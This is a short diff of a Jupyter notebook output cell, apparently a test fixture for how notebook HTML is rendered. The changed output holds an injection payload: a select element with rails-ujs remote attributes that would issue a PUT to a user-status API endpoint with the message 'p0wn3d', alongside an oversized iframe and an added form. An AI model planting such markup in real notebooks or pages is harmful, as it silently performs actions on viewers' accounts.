@@ -10,7 +10,7 @@
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
-           "text/html": "<input></input><iframe src=\"https://google.com\" width=\"2000\" height=\"2000\"></iframe>What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" data-url=\"/api/v4/user/status\"><option>Red</option><option>Green</option><option>Blue</option></select>\n"
+           "text/html": "<form method=\"get\" action=\"/\"><input></input><button type=\"submit\"></button></form><iframe src=\"https://google.com\" width=\"2000\" height=\"2000\"></iframe>What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" data-url=\"/api/v4/user/status\"><option>Red</option><option>Green</option><option>Blue</option></select>\n"
          },
          "metadata": {}
        }
